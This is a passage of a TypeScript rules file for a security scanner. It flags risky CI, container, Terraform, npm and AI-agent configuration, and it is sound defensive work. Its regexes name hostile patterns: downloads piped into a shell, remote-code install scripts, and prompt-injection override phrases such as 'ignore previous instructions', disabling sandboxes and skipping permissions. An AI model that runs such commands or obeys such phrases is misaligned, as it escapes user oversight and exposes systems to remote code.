import type { Finding, Severity } from '../types'

export type FileKind =
  | 'workflow'
  | 'dockerfile'
  | 'terraform'
  | 'kubernetes'
  | 'compose'
  | 'npm'
  | 'agent'
  | 'instructions'
  | 'guard'
  | 'other'

export const SEVERITIES: readonly Severity[] = ['low', 'medium', 'high', 'critical']

export const rank = (severity: Severity | 'never'): number =>
  severity === 'never' ? Infinity : SEVERITIES.indexOf(severity)

export type Rule = {
  id: string
  kind: FileKind | 'any'
  /** Custom rules: only paths this matches are scanned. */
  paths?: RegExp
  severity: Severity
  title: string
  fix: string
  /**
   * Line-level rules: the line and its context; return true to flag at the
   * rule's severity, or a severity to flag this one finding at that level.
   */
  line?: (line: string, ctx: LineContext) => boolean | Severity
  /** File-level rules: return the 0-based line to flag, or -1. */
  file?: (lines: readonly string[]) => number
}

type LineContext = { inRunBlock: boolean; text: string; lines: readonly string[]; index: number; path: string }

/**
 * The HCL block a line sits in: its header line and its whole body, found by
 * brace balance, so a rule can read the sibling attributes of a line.
 */
const enclosingBlock = (lines: readonly string[], index: number) => {
  const braces = (l: string) => (l.match(/\{/g)?.length ?? 0) - (l.match(/\}/g)?.length ?? 0)
  let depth = 0
  let start = 0
  for (let i = index - 1; i >= 0; i--) {
    depth += braces(lines[i] ?? '')
    if (depth > 0) {
      start = i
      break
    }
  }
  let end = lines.length - 1
  depth = 0
  for (let i = start; i < lines.length; i++) {
    depth += braces(lines[i] ?? '')
    if (depth <= 0 && i > start) {
      end = i
      break
    }
  }
  return { header: lines[start] ?? '', body: lines.slice(start, end + 1).join('\n') }
}

const WEB_PORTS = new Set([80, 443])

/** Ports a firewall/security-group block opens, or undefined when it names none. */
const portsOf = (body: string): number[] | undefined => {
  const ports = [
    ...[...body.matchAll(/\b(from_port|to_port|port|destination_port_range)\s*=\s*"?(\d+)"?/g)].map(m => Number(m[2])),
    ...[...body.matchAll(/\bports\s*=\s*\[([^\]]*)\]/g)].flatMap(m => [...(m[1] ?? '').matchAll(/\d+/g)].map(n => Number(n[0]))),
  ]
  return ports.length === 0 ? undefined : ports
}

/**
 * Whether a secret-named setting holds a reference rather than a secret: a
 * URL, a path, a variable, a number or boolean, or a name that says so
 * (`API_KEY_FILE`, `token_url`, `password_length`).
 */
const isReference = (name: string, value: string) =>
  /_(FILE|PATH|DIR|URL|URI|ENDPOINT|NAME|ID|ARN|REF|VERSION|LENGTH|POLICY|TYPE|ROTATION|TTL|MODE|ALGORITHM|COUNT|HEADER)$/i.test(name) ||
  /^["']?(\$\{?[\w.]+\}?|[a-z][\w+.-]*:\/\/\S*|\.{0,2}\/\S*|\d+|true|false|yes|no|on|off)["']?$/i.test(value.trim())

const FULL_SHA = /^[0-9a-f]{40}$/

const INJECTABLE =
  /\$\{\{\s*(github\.head_ref|github\.event\.(issue|pull_request|comment|review|review_comment|discussion|discussion_comment|head_commit|commits|pages)\b[^}]*\.(title|body|head_ref|ref|label|name|email|message|page_name|default_branch))\s*\}\}/

const SECRET_NAME = /(PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_?KEY|ACCESS_?KEY)/i

const isComment = (line: string) => /^\s*#/.test(line)

const PIPE_TO_SHELL = /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z)?sh\b/

const isUnpinnedImage = (image: string | undefined) => {
  if (image === undefined || image.includes('@sha256:') || image.includes('{{') || image.includes('$')) return false
  const tag = image.split('/').pop()!.split(':')[1]
  return tag === undefined || tag === 'latest'
}

/** The nearest `"key":` at or above a line, for JSON rules that care which list a value sits in. */
const nearestKey = (lines: readonly string[], index: number, keys: RegExp) => {
  for (let i = index; i >= 0; i--) {
    const m = keys.exec(lines[i] ?? '')
    if (m) return m[1]
  }
  return undefined
}

/** Whether the YAML mapping a line sits in (its siblings, same indent) has a key matching `re`. */
const hasSibling = (ctx: LineContext, re: RegExp) => {
  const line = ctx.lines[ctx.index] ?? ''
  const indent = line.length - line.trimStart().length
  const inBlock = (l: string) => l.trim() === '' || l.length - l.trimStart().length >= indent
  for (let i = ctx.index - 1; i >= 0 && inBlock(ctx.lines[i] ?? ''); i--) if (re.test(ctx.lines[i] ?? '')) return true
  for (let i = ctx.index + 1; i < ctx.lines.length && inBlock(ctx.lines[i] ?? ''); i++) if (re.test(ctx.lines[i] ?? '')) return true
  return false
}

const isSameScope = (scope: string | undefined, text: string) =>
  scope !== undefined && new RegExp(`^\\s*"name"\\s*:\\s*"${scope.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}/`, 'm').test(text)

/** The key of the JSON object a line sits in, found by brace balance above it. */
const enclosingKey = (lines: readonly string[], index: number) => {
  let depth = 0
  for (let i = index - 1; i >= 0; i--) {
    const l = lines[i] ?? ''
    depth += (l.match(/\}/g)?.length ?? 0) - (l.match(/\{/g)?.length ?? 0)
    if (depth < 0) return /"([^"]+)"\s*:\s*\{/.exec(l)?.[1]
  }
  return undefined
}

const DEPENDENCY_BLOCKS = new Set(['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies', 'overrides', 'resolutions'])
const inDependencies = (ctx: LineContext, blocks: ReadonlySet<string> = DEPENDENCY_BLOCKS) =>
  blocks.has(enclosingKey(ctx.lines, ctx.index) ?? '')

/** Commands that fetch and run a package: the package argument, if any. */
const LAUNCHERS: Record<string, (args: readonly string[]) => string | undefined> = {
  npx: args => args.find(a => !a.startsWith('-')),
  bunx: args => args.find(a => !a.startsWith('-')),
  'pnpm': args => (args[0] === 'dlx' ? args.slice(1).find(a => !a.startsWith('-')) : undefined),
  uvx: args => args.find(a => !a.startsWith('-')),
  pipx: args => (args[0] === 'run' ? args.slice(1).find(a => !a.startsWith('-')) : undefined),
}

const isPinnedPackage = (launcher: string, pkg: string) =>
  launcher === 'uvx' || launcher === 'pipx'
    ? /==|@\d/.test(pkg)
    : /^(@[^/]+\/)?[^@]+@\d[\w.+-]*$/.test(pkg) || pkg.startsWith('.') || pkg.startsWith('/')

/** MCP servers in a JSON config whose launcher fetches an unpinned package. */
const unpinnedServers = (text: string): string[] => {
  let json: unknown
  try {
    json = JSON.parse(text)
  } catch {
    return []
  }
  const found: string[] = []
  const walk = (node: unknown) => {
    if (Array.isArray(node)) return node.forEach(walk)
    if (node === null || typeof node !== 'object') return
    const { command, args } = node as { command?: unknown; args?: unknown }
    if (typeof command === 'string' && Array.isArray(args)) {
      const launcher = command.split(/[\\/]/).pop() ?? ''
      const pkg = LAUNCHERS[launcher]?.(args.filter((a): a is string => typeof a === 'string'))
      if (pkg !== undefined && !isPinnedPackage(launcher, pkg)) found.push(pkg)
    }
    Object.values(node).forEach(walk)
  }
  walk(json)
  return found
}

/**
 * Bidi overrides and isolates, and Unicode tag characters: text that reads
 * differently than it runs (Trojan Source). The embeddings RTL text uses
 * (U+202A-202C) are left alone, and so are the tags inside a flag emoji.
 */
const TROJAN = /[\u202D\u202E\u2066-\u2068]|\uDB40[\uDC00-\uDC7F]/
const FLAG_TAGS = /\u{1F3F4}[\u{E0020}-\u{E007E}]+\u{E007F}/gu
/** Translation files, where bidi controls are part of the language. */
const LOCALE_FILE = /(^|[\\/])(locales?|i18n|translations?|lang)[\\/]|\.(po|pot|xliff?|strings|arb)$/

/** Values that stand in for a secret in examples and local setups. */
const PLACEHOLDER =
  /^(change[-_]?me|password|passw0rd|postgres|mysql|mariadb|root|admin|secret|test|testing|example|dev|development|local|default|guest|user|pass|todo|tbd|replace[-_]?me|your[-_].*|x+|\*+|<[^>]*>)$/i
/** Paths of examples, tests and dev containers: their secrets are placeholders by design. */
const EXAMPLE_PATH = /(^|[\\/])(e2e|tests?|__tests__|examples?|samples?|fixtures?|\.devcontainer|benchmarks?|demo)[\\/]|\.(example|sample)\.[\w.]+$/i
/** Invisible characters with no business in an instruction file (the emoji joiner U+200D is left alone). */
const INVISIBLE = /[\u200B\u200C\u2060\u180E]|(?!^)\uFEFF/

const INJECTION =
  /\b(ignore|disregard|forget)\s+(all\s+)?(the\s+)?(previous|prior|above|earlier)\s+(instructions|rules|prompts?)\b|\b(do\s+not|don't|never)\s+(tell|inform|show|mention\s+(this|it)\s+to)\s+the\s+user\s+(about|what\s+you|that\s+you|you)\b|\b(disable|turn\s+off|bypass|skip)\s+(the\s+)?(shift-left-guard|security\s+guard|all\s+hooks|sandbox(ing)?|permission\s+(checks|prompts))\b|--dangerously-skip-permissions/i

/** `allUsers` as Cloud Run / Functions invoker is how a public service is meant to be exposed. */
const isPublicInvoker = (line: string, ctx: LineContext) =>
  /"allUsers"/.test(line) &&
  ctx.lines.slice(Math.max(0, ctx.index - 4), ctx.index + 5).some(l => /roles\/(run|cloudfunctions)\.invoker/.test(l))

export const RULES: readonly Rule[] = [
  // GitHub Actions
  {
    id: 'GHA001',
    kind: 'workflow',
    severity: 'medium',
    title: 'Action not pinned to a commit SHA',
    fix: 'Pin third-party actions to a full 40-char commit SHA and keep the tag as a comment: `uses: actions/checkout@<sha> # v4.2.2`.',
    line: line => {
      const m = /^\s*-?\s*uses:\s*['"]?([^'"\s#]+)/.exec(line)
      if (!m) return false
      const ref = m[1] ?? ''
      if (ref.startsWith('./') || ref.startsWith('docker://')) return false
      const at = ref.lastIndexOf('@')
      return at === -1 || !FULL_SHA.test(ref.slice(at + 1))
    },
  },
  {
    id: 'GHA002',
    kind: 'workflow',
    severity: 'critical',
    title: 'pull_request_target checks out untrusted PR code',
    fix: 'Never check out `github.event.pull_request.head.*` under `pull_request_target`. Use `pull_request`, or split into an unprivileged build job and a privileged `workflow_run` job.',
    file: lines => {
      if (!lines.some(l => /\bpull_request_target\b/.test(l) && !isComment(l))) return -1
      return lines.findIndex(l => /github\.event\.pull_request\.head\.(sha|ref)|refs\/pull\/.*\/merge/.test(l))
    },
  },
  {
    id: 'GHA003',
    kind: 'workflow',
    severity: 'high',
    title: 'Script injection: untrusted event data in run:/script:',
    fix: 'Move the expression into `env:` (e.g. `env: TITLE: ${{ github.event.issue.title }}`) and use `"$TITLE"` in the script; in actions/github-script read `process.env.TITLE` or `context.payload`.',
    line: (line, ctx) => ctx.inRunBlock && INJECTABLE.test(line),
  },
  {
    id: 'GHA004',
    kind: 'workflow',
    severity: 'high',
    title: 'permissions: write-all',
    fix: 'Grant the least privilege per job, e.g. `permissions: { contents: read }` and add only the scopes a job needs.',
    line: line => /^\s*permissions:\s*write-all\b/.test(line),
  },
  {
    id: 'GHA005',
    kind: 'workflow',
    severity: 'low',
    title: 'No top-level permissions block (token gets default scopes)',
    fix: 'Add `permissions: { contents: read }` at the top level and widen per job.',
    file: lines =>
      lines.some(l => /^permissions:/.test(l)) || !lines.some(l => /^jobs:/.test(l))
        ? -1
        : lines.findIndex(l => /^jobs:/.test(l)),
  },
  {
    id: 'GHA006',
    kind: 'workflow',
    severity: 'medium',
    title: 'Secret interpolated directly into run:/script:',
    fix: 'Pass secrets through `env:` and reference `"$MY_SECRET"`; inline `${{ secrets.X }}` ends up in the generated script and process list.',
    line: (line, ctx) => ctx.inRunBlock && /\$\{\{\s*secrets\.(?!GITHUB_TOKEN\b)/.test(line),
  },

  // Dockerfile
  {
    id: 'DKR001',
    kind: 'dockerfile',
    severity: 'medium',
    title: 'Base image not pinned (:latest or no tag)',
    fix: 'Pin a specific version, ideally with digest: `FROM python:3.13-slim@sha256:<digest>`.',
    line: (line, ctx) => {
      const m = /^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)/i.exec(line)
      if (!m) return false
      const image = m[1] ?? ''
      if (image === 'scratch' || image.includes('$') || image.includes('@sha256:')) return false
      const stages = [...ctx.text.matchAll(/^\s*FROM\s+.*\s+AS\s+(\S+)/gim)].map(s => (s[1] ?? '').toLowerCase())
      if (stages.includes(image.toLowerCase())) return false
      const tag = image.split('/').pop()!.split(':')[1]
      return tag === undefined || tag === 'latest'
    },
  },
  {
    id: 'DKR002',
    kind: 'dockerfile',
    severity: 'medium',
    title: 'Container runs as root',
    fix: 'Create an unprivileged user and switch to it before CMD: `RUN useradd -r -u 10001 app` + `USER app`.',
    file: lines => {
      // Only the final stage runs; a stage built FROM another inherits its USER.
      const stages = lines.flatMap((l, i) => {
        const m = /^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?/i.exec(l)
        return m ? [{ start: i, image: (m[1] ?? '').toLowerCase(), alias: m[2]?.toLowerCase() }] : []
      })
      const userIn = (stage: number, seen: number): { user: string; at: number } | undefined => {
        const s = stages[stage]
        if (s === undefined || seen > stages.length) return undefined
        const end = stages[stage + 1]?.start ?? lines.length
        for (let i = end - 1; i > s.start; i--) {
          const user = /^\s*USER\s+(\S+)/i.exec(lines[i] ?? '')?.[1]
          if (user !== undefined) return { user, at: i }
        }
        if (/nonroot|rootless/.test(s.image)) return { user: 'nonroot', at: s.start }
        const parent = stages.findIndex(p => p.alias === s.image)
        return parent >= 0 && parent < stage ? userIn(parent, seen + 1) : undefined
      }
      const last = stages.length - 1
      if (last < 0) return -1
      const found = userIn(last, 0)
      if (found === undefined) return stages[last]?.start ?? -1
      return /^(root|0)(:|$)/.test(found.user) ? found.at : -1
    },
  },
  {
    id: 'DKR003',
    kind: 'dockerfile',
    severity: 'high',
    title: 'Secret baked into the image via ENV/ARG',
    fix: 'Never put secrets in ENV/ARG (they stay in the image history). Use `RUN --mount=type=secret,id=...` at build time and inject at runtime from a secret manager.',
    line: line => {
      const m = /^\s*(ENV|ARG)\s+(\S+?)(?:[=\s]+(.*))?$/i.exec(line)
      const [name, value] = [m?.[2] ?? '', m?.[3]?.trim() ?? '']
      return SECRET_NAME.test(name) && value !== '' && !isReference(name, value)
    },
  },
  {
    id: 'DKR004',
    kind: 'dockerfile',
    severity: 'low',
    title: 'ADD instead of COPY',
    fix: 'Use `COPY` for local files; for downloads use `RUN curl` with a checksum check, or `ADD --checksum=sha256:...`.',
    line: line => /^\s*ADD\s/i.test(line) && !/--checksum=/.test(line),
  },
  {
    id: 'DKR005',
    kind: 'dockerfile',
    severity: 'medium',
    title: 'Remote script piped into a shell',
    fix: 'Download to a file, verify its checksum or signature, then run it.',
    line: line => PIPE_TO_SHELL.test(line),
  },

  // Terraform: GCP, AWS, Azure
  {
    id: 'TF001',
    kind: 'terraform',
    severity: 'high',
    title: 'Open to the whole internet (0.0.0.0/0)',
    fix: 'Restrict source ranges to known CIDRs, a load balancer or IAP (GCP: 35.235.240.0/20), or use private networking. Ports 80/443 on a public load balancer are expected: confirm it is one.',
    line: (line, ctx) => {
      if (isComment(line) || !/(0\.0\.0\.0\/0|::\/0)/.test(line) || /egress|destination/i.test(line)) return false
      const { header, body } = enclosingBlock(ctx.lines, ctx.index)
      const isOutbound =
        /\b(egress|route)\b|aws_route/.test(header) ||
        /\btype\s*=\s*"egress"|\bdirection\s*=\s*"(EGRESS|Outbound)"/i.test(body)
      if (isOutbound) return false
      const ports = portsOf(body)
      return ports !== undefined && ports.every(p => WEB_PORTS.has(p)) ? 'medium' : true
    },
  },
  {
    id: 'TF002',
    kind: 'terraform',
    severity: 'high',
    title: 'Publicly readable resource',
    fix: 'Remove public access: no `allUsers`/`allAuthenticatedUsers` members (GCP), no `public-read` ACL and keep S3 Block Public Access on (AWS), `public_network_access_enabled = false` (Azure).',
    line: (line, ctx) =>
      !isComment(line) &&
      !isPublicInvoker(line, ctx) &&
      /"allUsers"|"allAuthenticatedUsers"|acl\s*=\s*"public-read(-write)?"|(block_public_(acls|policy)|restrict_public_buckets|ignore_public_acls)\s*=\s*false|public_network_access_enabled\s*=\s*true|allow_nested_items_to_be_public\s*=\s*true/.test(line),
  },
  {
    id: 'TF003',
    kind: 'terraform',
    severity: 'high',
    title: 'Over-privileged IAM (owner/editor/admin wildcard)',
    fix: 'Grant a narrow predefined or custom role. GCP: avoid `roles/owner` and `roles/editor`; AWS: no `"*"` actions; Azure: avoid `Owner`/`Contributor` at subscription scope.',
    line: line =>
      !isComment(line) &&
      /"roles\/(owner|editor)"|AdministratorAccess|"Action"\s*:\s*"\*"|actions\s*=\s*\[\s*"\*"\s*\]|role_definition_name\s*=\s*"(Owner|Contributor)"/.test(line),
  },
  {
    id: 'TF004',
    kind: 'terraform',
    severity: 'medium',
    title: 'Database reachable from a public IP',
    fix: 'Use private IP / private endpoints. GCP Cloud SQL: `ipv4_enabled = false` + `private_network`, or keep public IP only with the Cloud SQL connector, IAM auth and no `authorized_networks`; AWS RDS: `publicly_accessible = false`.',
    line: line => !isComment(line) && /(publicly_accessible|ipv4_enabled)\s*=\s*true/.test(line),
  },
  {
    id: 'TF005',
    kind: 'terraform',
    severity: 'critical',
    title: 'Hard-coded secret in Terraform',
    fix: 'Reference a secret manager (`google_secret_manager_secret_version`, `aws_secretsmanager_secret_version`, `azurerm_key_vault_secret`) or a `sensitive = true` variable; generate passwords with `random_password`.',
    line: line => {
      const m = /^\s*(\w*(password|secret|token|api_key|private_key|access_key)\w*)\s*=\s*"([^"]{4,})"/i.exec(line)
      return !isComment(line) && m !== null && !(m[3] ?? '').startsWith('${') && !isReference(m[1] ?? '', m[3] ?? '')
    },
  },
  {
    id: 'TF006',
    kind: 'terraform',
    severity: 'medium',
    title: 'Encryption explicitly disabled',
    fix: 'Keep encryption at rest on (`storage_encrypted = true`, `encrypted = true`, `enable_https_traffic_only = true`).',
    line: line =>
      !isComment(line) && /\b(storage_encrypted|encrypted|enable_https_traffic_only|https_only)\s*=\s*false/.test(line),
  },
  {
    id: 'TF007',
    kind: 'terraform',
    severity: 'low',
    title: 'Deletion protection disabled',
    fix: 'Set `deletion_protection = true` on stateful production resources.',
    line: line => !isComment(line) && /deletion_protection\s*=\s*false/.test(line),
  },

  // Kubernetes
  {
    id: 'K8S001',
    kind: 'kubernetes',
    severity: 'high',
    title: 'Privileged container',
    fix: 'Remove `privileged: true`; grant only the specific `capabilities.add` the workload needs.',
    line: line => /^\s*privileged:\s*true\b/.test(line),
  },
  {
    id: 'K8S002',
    kind: 'kubernetes',
    severity: 'medium',
    title: 'Host namespace or hostPath shared with the pod',
    fix: 'Avoid `hostNetwork`/`hostPID`/`hostIPC` and `hostPath` volumes; use a PVC or a CSI driver.',
    line: line => /^\s*(hostNetwork|hostPID|hostIPC):\s*true\b|^\s*hostPath:/.test(line),
  },
  {
    id: 'K8S003',
    kind: 'kubernetes',
    severity: 'medium',
    title: 'Privilege escalation or root user allowed',
    fix: 'Set `securityContext: { runAsNonRoot: true, allowPrivilegeEscalation: false }`.',
    line: line => /^\s*allowPrivilegeEscalation:\s*true\b|^\s*runAsUser:\s*0\b|^\s*runAsNonRoot:\s*false\b/.test(line),
  },
  {
    id: 'K8S004',
    kind: 'kubernetes',
    severity: 'low',
    title: 'Image not pinned (:latest or no tag)',
    fix: 'Pin an explicit version tag or digest so rollouts are reproducible.',
    line: line => isUnpinnedImage(/^\s*-?\s*image:\s*['"]?([^'"\s]+)/.exec(line)?.[1]),
  },

  // Docker Compose
  {
    id: 'CMP001',
    kind: 'compose',
    severity: 'high',
    title: 'Privileged container',
    fix: 'Remove `privileged: true`; add only the capabilities the service needs with `cap_add:`.',
    line: line => /^\s*privileged:\s*true\b/.test(line),
  },
  {
    id: 'CMP002',
    kind: 'compose',
    severity: 'critical',
    title: 'Docker socket mounted into a container',
    fix: 'Do not mount `/var/run/docker.sock`: it is root on the host. Use a socket proxy with a read-only allow-list (e.g. tecnativa/docker-socket-proxy) if the service must talk to Docker.',
    line: line => !isComment(line) && /docker\.sock/.test(line),
  },
  {
    id: 'CMP003',
    kind: 'compose',
    severity: 'medium',
    title: 'Host namespace shared with the container',
    fix: 'Drop `network_mode: host`, `pid: host` and `ipc: host`; publish only the ports you need with `ports:`.',
    line: line => /^\s*(network_mode|pid|ipc):\s*['"]?host\b/.test(line),
  },
  {
    id: 'CMP004',
    kind: 'compose',
    // Mostly local dev defaults in practice; real token formats are SEC002 (critical) anyway.
    severity: 'medium',
    title: 'Secret written into the compose file',
    fix: 'Read it from the environment (`PASSWORD: ${DB_PASSWORD}` with a git-ignored `.env`) or use Compose `secrets:`.',
    line: (line, ctx) => {
      if (EXAMPLE_PATH.test(ctx.path)) return false
      const m = /^\s*-?\s*['"]?(\w+)['"]?\s*[=:]\s*['"]?([^'"#\s][^'"#]*)['"]?\s*$/.exec(line)
      const [name, value] = [m?.[1] ?? '', m?.[2]?.trim() ?? '']
      return (
        SECRET_NAME.test(name) && value.length >= 4 && !value.includes('${') && !PLACEHOLDER.test(value) && !isReference(name, value)
      )
    },
  },
  {
    id: 'CMP005',
    kind: 'compose',
    severity: 'low',
    title: 'Image not pinned (:latest or no tag)',
    fix: 'Pin an explicit version tag or digest so every `docker compose up` runs the same image.',
    line: (line, ctx) => isUnpinnedImage(/^\s*image:\s*['"]?([^'"\s]+)/.exec(line)?.[1]) && !hasSibling(ctx, /^\s*build:/),
  },

  // package.json
  {
    id: 'NPM001',
    kind: 'npm',
    severity: 'high',
    title: 'Install script downloads or runs remote code',
    fix: 'Install scripts run on every `npm install` of every user. Do not fetch or eval code there; ship the code in the package or make it an explicit, documented step.',
    line: line => {
      const m = /"(preinstall|install|postinstall|prepare)"\s*:\s*"([^"]*)"/.exec(line)
      return m !== null && /\b(curl|wget)\b|\|\s*(ba|z)?sh\b|\bnode\s+-e\b|base64\s+(-d|--decode)|\beval\b/.test(m[2] ?? '')
    },
  },
  {
    id: 'NPM002',
    kind: 'npm',
    severity: 'medium',
    title: 'Dependency installed from a git or HTTP URL',
    fix: 'Depend on a published version from the registry. If you must use git, pin a full commit SHA (`github:org/repo#<sha>`) and review it like vendored code.',
    line: (line, ctx) => {
      const m = /^\s*"([^"]+)"\s*:\s*"((?:git\+|git:|github:|gitlab:|bitbucket:|https?:\/\/)[^"]*)"/.exec(line)
      return m !== null && inDependencies(ctx) && !/#[0-9a-f]{40}$/.test(m[2] ?? '')
    },
  },
  {
    id: 'NPM003',
    kind: 'npm',
    severity: 'low',
    title: 'Dependency on any version (* or latest)',
    fix: 'Use a semver range (`^1.4.0`) and commit the lockfile, so installs are reproducible.',
    // Workspaces link local packages with "*", and peer/optional ranges are meant to be wide.
    // A package of the same @scope is a monorepo sibling, linked the same way.
    line: (line, ctx) =>
      /^\s*"[^"]+"\s*:\s*"(\*|latest|x)"\s*,?\s*$/.test(line) &&
      !/"workspaces"\s*:/.test(ctx.text) &&
      !isSameScope(/"(@[^/"]+)\//.exec(line)?.[1], ctx.text) &&
      inDependencies(ctx, new Set(['dependencies', 'devDependencies'])),
  },

  // Agent configuration: Claude Code settings, MCP servers, plugin hooks
  {
    id: 'AGT001',
    kind: 'agent',
    severity: 'high',
    title: 'Agent may run any shell command without asking',
    fix: 'Allow narrow commands (`Bash(npm test)`, `Bash(git status:*)`) instead of `Bash`, `Bash(*)` or `*`, and do not set `defaultMode: bypassPermissions` in a shared settings file.',
    line: (line, ctx) => {
      if (/"defaultMode"\s*:\s*"bypassPermissions"/.test(line)) return true
      const wildcard = /"(Bash|Bash\(\s*\*?\s*(:\s*\*)?\s*\)|\*)"/.test(line)
      return wildcard && nearestKey(ctx.lines, ctx.index, /"(allow|deny|ask)"\s*:/) === 'allow'
    },
  },
  {
    id: 'AGT002',
    kind: 'agent',
    severity: 'medium',
    title: 'Agent safeguards switched off',
    fix: '`disableAllHooks` stops every hook and mod, guards included; `enableAllProjectMcpServers` starts any MCP server a repository brings. Leave both off in shared settings and approve servers one by one.',
    line: line => /"(disableAllHooks|enableAllProjectMcpServers)"\s*:\s*true/.test(line),
  },
  {
    id: 'AGT003',
    kind: 'agent',
    severity: 'medium',
    title: 'MCP server package not pinned',
    fix: 'Pin the version the server runs (`"args": ["-y", "@org/server@1.4.2"]`, `uvx pkg==1.4.2`). Unpinned, every start runs whatever was published last, with your credentials.',
    file: lines => {
      const pkgs = unpinnedServers(lines.join('\n'))
      return pkgs.length === 0 ? -1 : lines.findIndex(l => l.includes(`"${pkgs[0]}"`))
    },
  },
  {
    id: 'AGT004',
    kind: 'agent',
    severity: 'high',
    title: 'Credential written into agent configuration',
    fix: 'Reference an environment variable (`"Authorization": "Bearer ${GITHUB_TOKEN}"`, `"env": { "API_KEY": "${API_KEY}" }`) so the secret never lands in the repository.',
    line: line => {
      const m = /"(\w*(?:TOKEN|SECRET|PASSWORD|API_?KEY|ACCESS_?KEY)\w*|Authorization|X-Api-Key)"\s*:\s*"([^"]{8,})"/i.exec(line)
      const [name, value] = [m?.[1] ?? '', m?.[2] ?? '']
      return m !== null && !value.includes('${') && !/^Bearer\s+\$/.test(value) && !isReference(name, value)
    },
  },
  {
    id: 'AGT007',
    kind: 'agent',
    severity: 'high',
    title: 'Hook command runs a remote script',
    fix: 'A hook runs on every matching event with your permissions. Keep the script in the repository and run it from there instead of piping a download into a shell.',
    line: line => /"command"\s*:/.test(line) && PIPE_TO_SHELL.test(line),
  },

  // Instruction files the agent reads: CLAUDE.md, AGENTS.md, skills, rules
  {
    id: 'AGT005',
    kind: 'instructions',
    severity: 'high',
    title: 'Invisible characters in an agent instruction file',
    fix: 'Remove zero-width characters: they hide text from reviewers that the model still reads. Retype the line if you cannot see where they are.',
    line: line => INVISIBLE.test(line),
  },
  {
    id: 'AGT006',
    kind: 'instructions',
    severity: 'high',
    title: 'Instruction file tells the agent to override its rules or run remote code',
    fix: 'Instruction files are prompts every session follows. Remove text that overrides earlier instructions, hides actions from the user, switches off safeguards or pipes downloads into a shell.',
    line: line => INJECTION.test(line) || PIPE_TO_SHELL.test(line),
  },

  // The guard's own repository config
  {
    id: 'AGT008',
    kind: 'guard',
    severity: 'high',
    title: 'Repository config switches off guard rules',
    fix: 'Disabling a rule turns it off for everyone in this repository. Agree on it with your team first, or silence single lines with `# guard:ignore <ID>`.',
    line: line => /"disable"\s*:\s*\[\s*"/.test(line),
    file: lines => {
      const start = lines.findIndex(l => /"disable"\s*:\s*\[\s*$/.test(l))
      return start >= 0 && /^\s*"/.test(lines[start + 1] ?? '') ? start : -1
    },
  },

  // Secrets: every file
  {
    id: 'SEC001',
    kind: 'any',
    severity: 'critical',
    title: 'Private key',
    fix: 'Remove the key from the file, rotate it, and load it from a secret manager or a mounted secret at runtime.',
    // A header alone (docs, commented examples) is no key: key material must follow,
    // on the same line (JSON service-account keys, `\n`-escaped) or the next one.
    line: (line, ctx) => {
      const header = /-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED |PGP )?PRIVATE KEY( BLOCK)?-----/.exec(line)
      if (header === null) return false
      const rest = line.slice(header.index + header[0].length).replace(/\\n/g, '')
      const next = (ctx.lines[ctx.index + 1] ?? '').replace(/^[\s#/*'"|-]+/, '')
      return /[A-Za-z0-9+/]{40,}/.test(rest) || /^[A-Za-z0-9+/=]{40,}/.test(next)
    },
  },
  {
    id: 'SEC002',
    kind: 'any',
    severity: 'critical',
    title: 'Cloud or SaaS credential',
    fix: 'Remove it, rotate it now, and read it from an environment variable or secret manager instead.',
    line: line =>
      !/EXAMPLE|example|xxxx|XXXX|<[^>]+>/.test(line) &&
      /\b(AKIA|ASIA)[0-9A-Z]{16}\b|\bAIza[0-9A-Za-z_-]{35}\b|\bgh[pousr]_[0-9A-Za-z]{36}\b|\bgithub_pat_[0-9A-Za-z_]{60,}\b|\bxox[baprs]-[0-9A-Za-z-]{10,}\b|\bsk_live_[0-9A-Za-z]{20,}\b|\bsk-ant-[0-9A-Za-z_-]{20,}\b|\bsk-proj-[0-9A-Za-z_-]{20,}\b|\bglpat-[0-9A-Za-z_-]{20}\b/.test(
        line,
      ),
  },
  {
    id: 'SEC003',
    kind: 'any',
    severity: 'high',
    title: 'Hidden bidirectional or tag characters (Trojan Source)',
    fix: 'Remove the invisible Unicode controls: they make code or prompts read differently than they run (CVE-2021-42574). Retype the line.',
    line: (line, ctx) => !LOCALE_FILE.test(ctx.path) && TROJAN.test(line.replace(FLAG_TAGS, '')),
  },
  {
    id: 'SEC004',
    kind: 'any',
    severity: 'high',
    title: 'Environment file not ignored by git',
    fix: 'Add it to `.gitignore` (e.g. `.env*` with `!.env.example`) before it is committed, and keep only placeholders in a checked-in `.env.example`.',
    // Needs git, so the mod and the CLI raise it with `envFinding`.
  },
]

/** `.env`, `.env.local`, `prod.env`; not the templates that are meant to be committed. */
export const isEnvFile = (path: string) => {
  const name = base(path)
  return (
    /^\.env(\..+)?$|\.env$/.test(name) &&
    !/\.(example|sample|template|dist|defaults|patch|schema)$|^\.envrc$|^(example|sample|template)[._-]/i.test(name)
  )
}

/**
 * Whether an env file holds a value that looks like a real secret: a
 * secret-named key with a literal that is no placeholder. A committed env
 * file of dev defaults is common; one with real credentials is the leak.
 */
export const envHasSecrets = (text: string) =>
  text.split(/\r?\n/).some(line => {
    const m = /^\s*(?:export\s+)?(\w+)\s*=\s*['"]?([^'"#\s]*)/.exec(line)
    const [name, value] = [m?.[1] ?? '', m?.[2] ?? '']
    return (
      SECRET_NAME.test(name) &&
      value.length >= 8 &&
      !value.includes('$') &&
      !PLACEHOLDER.test(value) &&
      !/(DO_NOT_USE|INSECURE|CHANGE|EXAMPLE|DUMMY|FAKE|LOCAL|DEV)/i.test(value) &&
      !isReference(name, value)
    )
  })

export const envFinding = (path: string): Finding => {
  const rule = RULES.find(r => r.id === 'SEC004')!
  return { id: rule.id, severity: rule.severity, title: rule.title, fix: rule.fix, line: 1, snippet: base(path) }
}

const base = (path: string) => path.split(/[\\/]/).pop() ?? path

const AGENT_CONFIG =
  /(^|[\\/])(\.claude[\\/]settings(\.local)?\.json|\.mcp\.json|\.(cursor|vscode)[\\/]mcp\.json|claude_desktop_config\.json|hooks[\\/]hooks\.json)$/
const INSTRUCTIONS =
